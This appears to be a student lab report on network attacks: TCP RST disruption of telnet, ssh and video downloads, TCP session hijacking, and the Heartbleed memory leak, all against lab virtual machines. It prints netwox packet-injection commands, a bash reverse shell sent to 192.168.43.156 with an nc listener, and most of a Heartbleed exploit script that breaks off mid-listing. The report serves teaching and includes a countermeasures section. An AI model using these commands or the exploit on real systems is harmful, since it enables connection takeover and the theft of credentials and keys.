\noindent By enabling SYN cookies, the server behaves as if the SYN queue has been enlarged. In addition, when the server receives a \texttt{SYN} request, it sends a \texttt{SYN+ACK} message to the sender and removes it from the SYN queue, freeing up resources to process new requests. If the request is legitimate and the server receives back an \texttt{ACK} message, the connection will be established by using the information contained in the TCP sequence number.\\\\Now that the SYN cookies have been enabled, executing the \texttt{telnet} command will allow the connection to be established even if the SYN queue is full. Figure \ref{fig:telnetconn} shows that this assumption is true and the connection can be made between the server and the user.
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{telnetconn}
	\caption{\texttt{Telnet} connection established}
	\label{fig:telnetconn}
\end{figure}

	\subsection{TCP RST Attacks on \texttt{telnet} and \texttt{ssh} Connections}	
	This task will focus on the breaking of \texttt{telnet} and \texttt{ssh} connections on the network. This method involves the attacker sniffing the network for packets originating or terminating at the selected endpoint and sending TCP reset (RST) packets to forcefully break the connection between two parties. This involves the RST flag of the TCP header to be set to 1, indicating to the endpoints that it must immediately terminate the connection.This technique can be used to maliciously interrupt Internet connections and block sites.\\\\On a normal connection via \texttt{telnet}, the user will be able to connect to the server and execute remote Terminal commands.
	\begin{figure}[H]
		\centering
		\includegraphics[width=1\linewidth]{telnetconn}
		\caption{\texttt{Telnet} connection established}
		\label{fig:telnetconn2}
	\end{figure}
	\noindent To manipulate the TCP connections, \texttt{netwox} must be used again. However, \texttt{netwox 78} must be used. This tool involves listening of the network and changing the RST flags of the TCP header to be enabled. To use \texttt{netwox 78}, the following code is used:
	\begin{verbatim}
	# netwox 78 --device "Eth0" --filter "dst host 192.168.43.157"
	\end{verbatim}
	The \texttt{--device} parameter is to define the network interface that will be used for listening to the connection and sending the RST packet while the \texttt{dst host} parameter is the IP address to keep note of. Once the above code has been executed by the attacker, any input that is made on the user's console will break the connection.
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{telnetbreak}
	\caption{Connection break}
	\label{fig:telnetbreak}
\end{figure}
\noindent As demonstrated in Figure \ref{fig:telnetbreak}, typing a single character `` \`{} '' is sufficient to break the connection between the two endpoints, indicated by the string ``Connection closed by the foreign host.''\\\\The same attack is tried on an SSH connection. SSH is an acronym for \textbf{S}ecure \textbf{SH}ell, which allows for encrypted information to be sent over an unsecured channel, which is an extension of Telnet.\\\\On first connection using SSH, an ECDSA key fingerprint from the server must be accepted to establish trust between the endpoints before a secure connection can be established. The following code is used to login to the endpoint and this process is reflected below.
\begin{verbatim}
$ ssh seed@192.168.43.157
\end{verbatim}
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{sshacceptance}
	\caption{Acceptance of SSH key and login}
	\label{fig:sshacceptance}
\end{figure}
The disruption of the network connection is repeated using the same technique as the Telnet task as previously done, and the result is shown in Figure \ref{fig:sshbroken}.
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{sshbroken}
	\caption{SSH Connection Terminated}
	\label{fig:sshbroken}
\end{figure}
\subsection{TCP RST Attacks on Video Streaming Applications}
\begin{par} The same attack as done in the previous task can be extended to video streaming applications. This can be done to disrupt the TCP sessions between any user and the respective server. To initiate the attack, a large video (approximately 5GB) is placed on the server at the location \texttt{/var/www/vid/} where the video can be viewed via a web browser with reference to the IP address of the server (\texttt{http://192.168.43.157/vid/2k10game.avi}).\\\\However, if the attack is done while the video is playing in the browser, the disruption may not be immediate due to the buffering. To simplify the task, we use \texttt{wget} to emulate the transfer of the video data via TCP connections (TCP port 80).\\\\To start the transfer of the video from the server to the user, the following command can be used.
	\end{par}
\begin{Verbatim}
$ wget -O ./Desktop/vid.avi http://192.168.43.157/vid/2k10game.avi
\end{Verbatim}
By executing the command, (multiple) TCP connections between the endpoints will be established and transferring will occur. Figure \ref{fig:wget} shows the transferring of the video using TCP connections via Terminal.

\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{wget}
	\caption{TCP Connections via \texttt{wget}}
	\label{fig:wget}
\end{figure}
\noindent If the attacker executes the command to disrupt the TCP connections, the user will eventually realise that the video will be interrupted and a refreshing of the browser will not re-establish the connection, permanently disabling the channel between the user and the server. Figure \ref{fig:wgeterror} shows the attempt to connect from the user's side after an attacker has used \texttt{netwox} to reset the TCP packets.

\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{wgeterror}
	\caption{TCP disruption on Video Streaming}
	\label{fig:wgeterror}
\end{figure}
\noindent We can also see that interruption of the connection, there is no transfer of any data. This makes it useful for legitimate uses such as a corporate firewall.
\subsection{TCP Session Hijacking}
\begin{par}This task will involve the hijacking of a TCP session to compromise an established connection. It can be used to inject malicious code to either endpoint and compromising the integrity of the systems. \texttt{Netwox 40} will be used in this task to spoof TCP packets.\\\\Before attempting to spoof any packets, the IP addresses and the TCP port numbers of both endpoints must be known. Wireshark can be used to listen to the packets on the local network. \\\\To start capturing the required packets, a Telnet connection needs to be established. A Terminal is opened and the Telnet command is executed. As the Virtual Machines might have other programs that are transmitting packets to endpoints over the internet, it is significantly useful to display the captured packets with the required relevant information. As most of the details are already known from the previous sections, the following expression can be used to filter the packets.
	\end{par}
	\begin{verbatim}
	(ip.addr==192.168.43.157 || ip.addr==192.168.43.154)&& tcp.port==23
	\end{verbatim}
	\begin{par}
	\noindent The filter above will only display packets that are being sent between the user and the server with reference to Telnet (TCP Port 23). Figure \ref{fig:telnetpacket} shows the filtered display with the required packets that will be used for analysis later.\end{par}
	
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{telnetpacket}
	\caption{Filtered Telnet Packets}
	\label{fig:telnetpacket}
\end{figure}
\begin{par}
	\noindent Before proceeding, it is important to check if the filtered packets are those that are required for analysis. To do so, the stream can be analysed to determine the information that has been transmitted. In the case of Telnet, the transmission is across an unsecured channel with no encryption or hashing and can easily be read when analysing from Wireshark. Figure \ref{fig:telnetsniff} displays how the username and password of the Telnet connection can be obtained when the option ``Follow TCP Stream'' is used on the correct stream of packets, which indicates the respective stream that is required for injecting arbitrary code later.
\end{par}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\linewidth]{telnetsniff}
	\caption{Telnet Details Revealed}
	\label{fig:telnetsniff}
\end{figure}


	\begin{par}
	\noindent It is also important to note that the sequence numbers (seqnum) and acknowledge numbers (acknum) are relative to the respective packets being transmitted and may not reflect the actual value. To change this, the option for relative sequence numbers is disabled. This can be done by right-clicking the TCP field in the packet, selecting protocol preferences and de-selecting the ``Relative Sequence Numbers" option. Figure \ref{fig:frameopt} provides a visual guide on where this option can be found on Wireshark (\textbf{Note:} Older Ethereal versions will have this option named as ``Relative Sequence Numbers and Window Scaling).\end{par}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\linewidth]{frameopt}
	\caption{Relative seqnum Option}
	\label{fig:frameopt}
\end{figure}
\begin{par}
	\noindent By analysing specifically packets with the info ``Telnet Data...", it is immediately noticeable that each succeeding packet between both endpoints alternates the ``Next sequence number" and ``Acknowledgement number". Figure \ref{fig:seqnum} shows the different fields present in the TCP packet.
	\end{par}
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{seqnum}
	\caption{Telnet Packet Details}
	\label{fig:seqnum}
\end{figure}

\begin{par}
\noindent When using \texttt{netwox 40} to spoof packets, the packet fields can be preserved. Furthermore, it is of value to note that each Telnet data packet has a window size value that is not fixed from packet to packet. Therefore, it is worth trying a large value initially to see if the attack succeeds. The data that will be injected into the packet will be the command \texttt{ls}. To do so, the packet is constructed as such.
\end{par}
	\begin{verbatim}
	# netwox 40 -g -i 0 -k 6 -G "" -E 254 -l 192.168.43.154 
	-m 192.168.43.157 -o 49895 -p 23 -q 3167875908 -r 2853610514 -z 
	-A -H "'ls'0d0a" -j 64 -a "best"
	\end{verbatim}
\begin{par}
\noindent Verbatim Code Legend:
	\begin{enumerate} \itemsep0em 
		\item \texttt{-g}: IPv4 Don't fragment (IPv4 Flag 0x2)
		\item \texttt{-i 0}: IPv4 Fragment Offset
		\item \texttt{-k 6}: IPv4 Protocol (TCP: 6)
		\item \texttt{-G ""}: TCP Options (None as it is not required)
		\item \texttt{-E 254}: TCP Window Size
		\item \texttt{-l 192.168.43.154}: Source IP
		\item \texttt{-m 192.168.43.157}: Destination IP
		\item \texttt{-o 49895}: Source Port (From Wireshark)
		\item \texttt{-p 23}: Destination Port (Telnet)
		\item \texttt{-q 3167875908}: Seqnum (Acknum from previous packet)
		\item \texttt{-r 2853610514}: Acknum (Next seqnum from previous packet) 
		\item \texttt{-z}: TCP Acknowledgement (TCP Flag 0x8)
		\item \texttt{-A}: TCP Push (TCP Flag 0x10)
		\item \texttt{-H "`ls'0d0a"}: TCP Mixed Data (Hex value 0d0a denotes \textbackslash r\textbackslash n)
		\item \texttt{-j 64}: IPv4 Time-To-Live (TTL)
		\item \texttt{-a "best"}: IP spoofing initialisation type
	\end{enumerate}
\end{par}
\vspace{1em}
\begin{par}
\noindent When the packet injection is successful, Wireshark will capture the packet as a normal TELNET packet. Looking at the data field of the Telnet packet, the mixed data that was input previously can be seen. The server will reply with the relevant data from the \texttt{ls} command. However, the server has not yet received an \texttt{ACK} signal after the injected packet has been sent, prompting TCP Retransmission packets over the network. Figure \ref{fig:netwoxinject} and \ref{fig:packetinjectret} shows the data that was sent in the spoofed IP and the abnormal behaviour when the \texttt{ACK} signal was not sent timely back to the server.\end{par}
\begin{figure}[H]
	\centering
	\includegraphics[width=0.9\linewidth]{netwoxinject}
	\caption{Successful Injection of Arbitrary Code}
	\label{fig:netwoxinject}
\end{figure}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.9\linewidth]{packetinjectret}
	\caption{Data Return \& TCP Retransmission Packets}
	\label{fig:packetinjectret}
\end{figure}
\noindent To solve the issue of the TCP Retransmission Packets, we use \texttt{netwox 40} again with the following code instead to send an \texttt{ACK} signal only.
	\begin{verbatim}
# netwox 40 -g -i 0 -k 6 -G "" -E 254 -l 192.168.43.154 
-m 192.168.43.157 -o 49895 -p 23 -q 3167875912 -r 2853611285 -z 
-j 64 -a "best"
\end{verbatim}
\begin{par}
	\noindent Looking at Wireshark again, after the \texttt{ACK} signal has been received, the server now returns the usual Terminal prompt, waiting for the user's input. The connection can be terminated by using the TCP RST flag \texttt{-B} or by using \texttt{netwox 78} as per the previous task.
	\end{par}
\subsection{Creating Reverse Shell Using TCP Session Hijacking}
\begin{par}This task follows up on injecting arbitrary code into spoofed TCP packets by executing a reverse shell, ultimately allowing the attacker to take control of the server. To perform a reverse shell, the attacker will need to open a Terminal console to listen to an incoming connection. The following code performs the abovementioned task.\end{par}
	\begin{verbatim}
	$ nc -l 9090 -v
	\end{verbatim}
	Again, we use Wireshark to analyse the next seqnum and acknum on the Telnet Data packet. From Figure \ref{fig:telnetinjectreverse}, we obtain the relevant details of the packet and execute the command to create a reverse shell.
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{telnetinjectreverse}
	\caption{Obtain Next seqnum \& acknum}
	\label{fig:telnetinjectreverse}
\end{figure}
\begin{verbatim}
# netwox 40 -g -i 0 -k 6 -G "" -E 254 -l 192.168.43.154 
-m 192.168.43.157 -o 49897 -p 23 -q 138267333 -r 688783074 -z -A 
-H "'/bin/bash -i > /dev/tcp/192.168.43.156/9090 0<&1 2>&1'0d0a" 
-j 64 -a "best"
\end{verbatim}
The executed command redirects the bash shell to the attacker's Terminal console and the system is now vulnerable, as can be seen in Figure \ref{fig:telnetinjectreversedone} where the \texttt{pwd} command reflects a different directory than when originally executed.
\begin{figure}[H]
	\centering
	\includegraphics[width=0.85\linewidth]{telnetinjectreversedone}
	\caption{Reverse Shell Obtained}
	\label{fig:telnetinjectreversedone}
\end{figure}

%PDF 2: Heartbleed Attack%

\begin{titlepage}
		\begin{center}
		\vspace*{27em}
		\Huge
			\textbf{Heartbleed Attack}
			\vfill
		\end{center}
	\end{titlepage}
	
	\pagenumbering{roman}
	\newpage
	\pagenumbering{arabic}
	\setcounter{section}{0}
	\section{Introduction}
	The Heartbleed bug is a severe vulnerability in the OpenSSL library that was discovered in 2014 (CVE-2014-0160). This allowed attackers to obtain data located on the server's memory and may contain sensitive data such as usernames, passwords, credit card details etc although the communication channel is encrypted with SSL/TLS. Attackers may also use this method to defeat encrypted traffic by reading the encryption keys off the server memory and can be used to steal data without being detected.\\\\The affected service is in the heartbeat extension, which is used to keep the encrypted SSL/TLS connection alive without requiring renegotiation\footnote{\hyperlink{https://tools.ietf.org/html/rfc6520}{RFC 6520}}. \\\\On a normal packet, the data that is being requested is copied to the memory of the server and used to construct a response packet back to the user. As the length of the data requested is the same as the length of the data in the memory, there is no leaking of sensitive data. However, if the \texttt{payload\_length} field has a value larger than the data that is being requested, the request packet will include data in memory locations what has been requested. Figure
\ref{fig:Heartbeat} and \ref{fig:Heartbleed} respectively depicts in graphical form how the heartbeat protocol operates and the Heartbleed attack is executed on the same platform.
						\begin{figure}[H]
		\centering
		\begin{tikzpicture}	
		
		\draw (0,0) rectangle node{\small Type(request)} (4.5,-1);
		\draw (0,-1) rectangle node {\small Payload\_length (3)} (4.5,-2);
		\draw (0,-2) rectangle node {\small Payload[Payload\_length]} (4.5,-3);
		\draw (0,-3) rectangle node {\small Padding[Padding\_length]} (4.5,-4);
		\draw (2.25,-4.5) node{Request packet};
		
				\draw (9.5,0) rectangle node{\small Type(response)} (14,-1);
		\draw (9.5,-1) rectangle node {\small Payload\_length (3)} (14,-2);
		\draw (9.5,-2) rectangle node {\small Payload[Payload\_length]} (14,-3);
		\draw (9.5,-3) rectangle node {\small Padding[Padding\_length]} (14,-4);
		\draw (11.75,-4.5) node {Response packet};
		
		\draw[->,>=stealth',line width=0.4mm] (4.5,-1.5) --(7,-1.5) node[yshift=0.3cm]{\LARGE =} -- (9.5,-1.5);
		\draw[<->,>=stealth',line width=0.4mm] (2.5,-1.8) -- (2.8,-2.2);
		\draw[<->,>=stealth',line width=0.4mm] (12,-1.8) -- (12.3,-2.2);
		\draw [decorate,decoration={brace,amplitude=8pt},yshift=0pt,line width=0.4mm]
		(9,-7.8) -- (9,-9) node{};
		
		
				\draw[fill=gray!20] (5,-5.5) rectangle node{\small Memory} (9,-7.8);
		\draw[fill=red!10] (5,-7.8) rectangle node[text width=3.5cm, align=center]{\small ``XYZ"\\(Data)} (9,-9);
		\draw[fill=gray!20] (5,-9) rectangle node {\small Memory} (9,-9.5);
		
		\draw[bend left, line width=0.4mm] (4.5,-2.5) to (4.5,-5.25);
		\draw[bend right,->,>=stealth',line width=0.4mm] (4.5,-5.25) to (5,-9);
		\draw[bend right,<-,>=stealth',line width=0.4mm] (9.5,-2.5) to (9.5,-5.25);
		\draw[bend left,line width=0.4mm] (9.5,-5.25) to (9.3,-8.4);
		\draw[line width=0.4mm,->,>=stealth'](9.3,-8.4) -- (10.2,-8.4) node[xshift=2.5cm,text width=5cm] {Requested\\ data payload};
		
		\draw[->,>=stealth',line width=0.4mm] (12.7,-9.5) -- (12.7,-5.5);
		\draw (13.8,-7.5) node[text width=2cm]{Data\\ reading\\ direction};
		\end{tikzpicture}
		\caption{Heartbeat Communication}
		\label{fig:Heartbeat}
	\end{figure}
	\begin{figure}[H]
		\centering
		\begin{tikzpicture}	
		
		\draw (0,0) rectangle node{\small Type(request)} (4.5,-1);
		\draw (0,-1) rectangle node[text width=4.1cm] {\small Payload\_length+1000 (1003)} (4.5,-2.6);
		\draw (0,-2.6) rectangle node[text width=4.1cm] {\small Payload[Payload\_length]} (4.5,-4.1);
		\draw (0,-4.1) rectangle node {\small Padding[Padding\_length]} (4.5,-5.2);
		\draw (2.25,-5.7) node{Request packet};
		
		\draw (9.5,0) rectangle node{\small Type(response)} (14,-1);
		\draw (9.5,-1) rectangle node[text width=4.1cm] {\small Payload\_length+1000 (1003)} (14,-2.6);
		\draw (9.5,-2.6) rectangle node[text width=4.1cm] {\small Payload[Payload\_length\\+1000]} (14,-4.1);
		\draw (9.5,-4.1) rectangle node {\small Padding[Padding\_length]} (14,-5.2);
		\draw (11.75,-5.7) node {Response packet};
		
		\draw[->,>=stealth',line width=0.4mm] (4.5,-1.8) --(7,-1.8) node[yshift=0.3cm]{\LARGE =} -- (9.5,-1.8);
		\draw[<->,>=stealth',line width=0.4mm] (2.5,-1.8) -- (2.8,-2.8);
		\draw[<->,>=stealth',line width=0.4mm] (12,-1.8) -- (12.3,-2.8);
		\draw [decorate,decoration={brace,amplitude=8pt},yshift=0pt,line width=0.4mm]
		(9,-6.5) -- (9,-10);
		
		
		\draw[fill=red!40] (5,-6.5) rectangle node{\small Compromised memory} (9,-8.8);
		\draw[fill=red!10] (5,-8.8) rectangle node[text width=3.5cm, align=center]{\small ``XYZ"\\(Data)} (9,-10);
		\draw[fill=gray!20] (5,-10) rectangle node {\small Memory} (9,-10.5);
		
		\draw[bend left, line width=0.4mm] (4.5,-3.35) to (4.75,-6.5);
		\draw[bend right,->,>=stealth',line width=0.4mm] (4.75,-6.5) to (5,-10);
		\draw[bend right,<-,>=stealth',line width=0.4mm] (9.5,-3.35) to (9.5,-6.75);
		\draw[bend left,line width=0.4mm] (9.5,-6.75) to (9.3,-8.25);
		\draw[line width=0.4mm,->,>=stealth'](9.3,-8.25) -- (10.2,-8.25) node[xshift=2.5cm,text width=5cm] {Requested\\ data payload};
		
		\draw[->,>=stealth',line width=0.4mm] (12.7,-10.5) -- (12.7,-6.5);
		\draw (13.8,-8.5) node[text width=2cm]{Data\\ reading\\ direction};
		\end{tikzpicture}
		\caption{Heartbleed Attack}
		\label{fig:Heartbleed}
	\end{figure}
	\section{Overview}
	This report provides a hands-on analysis on how the exploit can be used to extract confidential and sensitive information from outdated and unpatched servers. Furthermore, it will also look at the code to determine the absence of a safety mechanism that could have prevented this bug from being exploited. (Note: Newer versions of OpenSSL ($>$1.0.1f) do not have this vulnerability and cannot be replicated on newer Operating Systems (OS). This is so as older OpenSSL versions are not available in repositories for newer OS, with the exception of Windows as previous versions installers can still be found on the internet.)

	\begin{par}
		\end{par}
		\newpage
	\section{Attack Sequence}
	\subsection{Virtual Machine (VM) Preparation}

	\subsubsection{Network Setup}
		\vspace{1em}
		2 VMs are deployed to the same network using the provided Ubuntu 12.04
	image. The topography of the network with the respective IP
	addresses are reflected in Figure \ref{fig:Networksetup}.
						\begin{figure}[H]
		\centering
		\begin{tikzpicture}	
		
		\draw[fill=red!10] (-5.15,2.15) rectangle (-3.85,1.25);
		\draw (-5.3,2.3) rectangle (-3.7,1.1);
		\draw (-4.1,1.1) rectangle (-4.9,0.6);
		\draw (-5.1,0.75) -- (-5.5,0.4);
		\draw (-3.9,0.75) -- (-3.5,0.4);
		\draw (-5.5,0.4) -- (-3.5,0.4);
		\draw (-5.1,0.75) -- (-4.9,0.75);
		\draw (-3.9,0.75) -- (-4.1,0.75);
		\draw (-4.5,-0.3) node[text width=3cm, align=center]{Attacker\\192.168.43.156};
		
		\draw[fill=green!10] (3.05,2.15) rectangle (4.35,1.25);
		\draw (2.9,2.3) rectangle (4.5,1.1);
		\draw (4.1,1.1) rectangle (3.3,0.6);
		\draw (3.1,0.75) -- (2.7,0.4);
		\draw (4.3,0.75) -- (4.7,0.4);
		\draw (2.7,0.4) -- (4.7,0.4);
		\draw (3.1,0.75) -- (3.3,0.75);
		\draw (4.3,0.75) -- (4.1,0.75);
		\draw (3.7 ,-0.3) node[text width=3cm, align=center]{Server\\192.168.43.157};
		
		\draw (3.7,-0.8) -- (3.7,-2.4);
		\draw (-4.5,-0.8) -- (-4.5,-2.4);
		\draw (3.7,-2.4) -- (0.4,-2.95);
		\draw (-4.5,-2.4)--(-1.2,-2.95);
		\draw[densely dotted, line width=0.3mm](-4.5,-1.5) -- (3.7,-1.5);
		
		
		\draw[fill=yellow!10] (-1.05,-2.85) rectangle (0.25,-3.75);
		\draw (-1.2,-2.7) rectangle (0.4,-3.9);
		\draw (0,-3.9) rectangle (-0.8,-4.4);
		\draw (-1,-4.25) -- (-1.4,-4.6);
		\draw (0.2,-4.25) -- (0.6,-4.6);
		\draw (-1.4,-4.6) -- (0.6,-4.6);
		\draw (-1,-4.25) -- (-0.8,-4.25);
		\draw (0.2,-4.25) -- (0,-4.25);
		\draw (-0.4,-5.3) node[text width=3cm,align=center]{Gateway\\192.168.43.2};
		\end{tikzpicture}
		\caption{Network Configuration}
		\label{fig:Networksetup}
	\end{figure}
\subsubsection{Editing \texttt{HOSTS} file}
The \texttt{hosts} file is used to forcibly map domains to defined IP addresses of the user's choosing. Any form of requests that are made to the domains present in the hosts file are redirected to the IP address stated within the file.\\\\As it is illegal to hack any websites over the internet, a Content Management System (CMS) from Elgg has been installed for this purpose and is accessible through the server VM. To redirect the domain name on the attacker's VM to the server VM, the hosts file needs to be modified. The hosts file is located at \texttt{/etc/hosts} and can only be edited using a privileged account. In the hosts file, the entry for \texttt{www.heartbleedlabelgg.com} has its IP address modified from \texttt{127.0.0.1} to \texttt{192.168.43.157}. 
\newpage
	\subsection{Heartbleed Attack}
To initiate the attack, enough data must be on the server for the attack to be successful. Some interactions were performed on the server.
\begin{enumerate}
	\item Logging in using the site administrator account (username: admin, password: seedelgg)
	\item Adding ``Boby'' as a friend
	\item Sending ``Boby'' a private message
\end{enumerate}
The private message that was sent has a subject field and a message field, similar to the format used in emails. The figure below displays the message that was sent from the administrator to ``Boby''.

\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\linewidth]{PM}
	\caption{Private Message}
	\label{fig:pm}
\end{figure}
\noindent The code that is being used is in a file named \texttt{attack.py} and has been provided as a Github fork from ``sh1n0b1'' as it requires a deep understanding of the Heartbeat protocol to write code that exploits this vulnerability. The code has been attached to the Appendix for reference.\\\\Before we can use the code to initiate the attack, it must first be marked as executable by using the command \texttt{chmod 775 attack.py}. After which, the code can be run by using the following line.
\begin{verbatim}
$ attack.py http://www.heartbleedlabelgg.com
\end{verbatim}
Executing the code may result in unrelated data being printed and may multiple tries to extract useful information. Figure \ref{fig:noimptinfo} shows one of the multiple results obtained from the code execution.

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{heartbleedexec}
\caption{No Information Exposed}
\label{fig:noimptinfo}
\end{figure}

\noindent However, instead of relying on random data being printed from the code, the code provides a feature to increase the amount of data that can be read from the server memory by explicitly specifying the length. The ``\texttt{-l}'' option is specified with a longer length (default is 16384), such as 65535 (Maximum length is payload\_length is stored as a 2 byte unsigned integer). Doing so, the amount of tries required to expose the same amount of information can be decreased. A longer length could also prevent the acquired data from being cut-off and requiring extra executions. Figure \ref{fig:userpass} and \ref{fig:privmsg} shows how sensitive information can be exposed even when there is encryption between the endpoints.

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{userpass}
\caption{Username and Password Exposed}
\label{fig:userpass}
\end{figure}

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{PrivMsg}
\caption{Private Message Exposed}
\label{fig:privmsg}
\end{figure}
\noindent Furthermore, some executions will also print the ``Referer'' field which gives us extra insight on what interactions were made with the system, if the links are human readable.\\\\In addition, an interesting observation to note that is if the length is small, little useful information will be printed as fields such as the language, encoding, referer, cookie names will reflect minimal differences, or duplicated at best.
\\\\To determine the amount of data that is sent normally without any leaking of data, the length of the data requested must be decreased. To speed up the determination, the length is halved until the string ``Server processed malformed Heartbeat, but did not return any extra data.'' has been displayed and slowly increased until the string is no longer printed. The length was determined to be 22 and Figure displays the output when the length is set to 22 and 23 respectively.

\begin{figure}[H]
    \centering
    \begin{subfigure}[H]{0.49\textwidth}
        \centering
        \includegraphics[width=1\linewidth]{l22}
        \caption{Length 22}
    \end{subfigure}%
    ~ 
    \begin{subfigure}[H]{0.49\textwidth}
        \centering
        \includegraphics[width=1\linewidth]{l23}
        \caption{Length 23}
    \end{subfigure}
    \caption{Different Length Results}
    %\label{fig:lengthdetermination}
\end{figure}
\subsection{Countermeasures, Bug Fix \& Code Analysis}
We start this task by taking a snapshot of the VM as the OpenSSL version needs to be updated and downgrading later will be problematic. To update OpenSSL, the following 2 lines of code are executed in Terminal.
\begin{verbatim}
$ sudo apt-get update -y
$ sudo apt-get upgrade -y
\end{verbatim}
When the same attack is executed again, no further information is displayed. This shows that the critical vulnerability has been patched and cannot be exploited with the newer versions. Figure \ref{fig:updated} shows the output of the code after updating.

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{updated}
\caption{No Data Leak}
\label{fig:updated}
\end{figure}


\noindent Next, we need to analyse the code that causes OpenSSL to be vulnerable. The code has been attached to the Appendix for reference.\\\\If we look at the code that generates the response packet, the line containing \texttt{memcpy(bp,pl,payload)} stands out as it becomes apparent that pointer \texttt{pl} is only referenced previously as a placement pointer, which means that the size of the actual payload is not checked. In the event that the length of the payload is smaller than the declared payload length, the pointer \texttt{pl} will exceed the boundary of the payload, read the padding and eventually read the surrounding memory regions, depending on the declared length of the payload and the location of \texttt{malloc} in the memory region.\\\\
A simple method to fix this is to add an extra line to check if the length of the payload is exactly as declared in the payload\_length field.
\subsection{Discussion}
This section will look at the discussion based on three statements made by Alice, Bob and Eva based on the fundamental cause of the Heartbleed vulnerability.
\begin{enumerate}
	\itemsep0em
	\item Alice: Fundamental cause is missing the boundary checking during the buffer copy
	\item Bob: Missing input validation
	\item Eva: Delete the length value from the packet to solve everything
\end{enumerate}
When performing boundary checking, performance will be affected as the variable will always need to be checked, which is not efficient as SSL/TLS transactions will slow down the servers. Missing input validations does not eliminate the error of mismatched length even when the input is valid (between 1 and 65535). Deleting the input field does not solve the issue as the length must be known for the response packet to have the correct amount of information.
\newpage
\section{Appendix}
\subsection{attack.py}
\vspace{1em}
\begin{minted}[linenos,breaklines]{python}
#!/usr/bin/python

# Code originally from https://gist.github.com/eelsivart/10174134
# Modified by Haichao Zhang
# Last Updated: 2/12/15
# Version 1.20
#
# -added option to the payload length of the heartbeat payload
# Don't forget to "chmod 775 ./attack.py" to make the code executable 
# Students can use eg. "./attack.py www.seedlabelgg.com -l 0x4001" to send the heartbeat request with payload length variable=0x4001
# The author disclaims copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
import time
import os
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-l', '--length', type='int', default=0x4000,dest="len", help='payload length to test (default: 0x4000)')
options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...')
options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port')
options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Enable verbose output')
options.add_option('-x', '--hexdump', action="store_true", dest="hexdump", help='Enable hex output')
options.add_option('-r', '--rawoutfile', type='str', help='Dump the raw memory contents to a file')
options.add_option('-a', '--asciioutfile', type='str', help='Dump the ascii contents to a file')
options.add_option('-d', '--donotdisplay', action="store_true", dest="donotdisplay", help='Do not display returned data on screen')
options.add_option('-e', '--extractkey', action="store_true", dest="extractkey", help='Attempt to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned data on screen.')

opts, args = options.parse_args()

if opts.extractkey:
    import base64, gmpy
    from pyasn1.codec.der import encoder
    from pyasn1.type.univ import *

def hex2bin(arr):
    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')

tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}

def build_client_hello(tls_ver):
    client_hello = [

# TLS header ( 5 bytes)
0x16,               # Content type (0x16 for handshake)
0x03, tls_ver,         # TLS Version
0x00, 0xdc,         # Length

# Handshake header
0x01,               # Type (0x01 for ClientHello)
0x00, 0x00, 0xd8,   # Length
0x03, tls_ver,         # TLS Version

# Random (32 byte)
0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
0x00,               # Session ID length
0x00, 0x66,         # Cipher suites length

# Cipher suites (51 suites)
0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
0x01,               # Compression methods length
0x00,               # Compression method (0x00 for NULL)
0x00, 0x49,         # Extensions length

# Extension: ec_point_formats
0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,

# Extension: elliptic_curves
0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
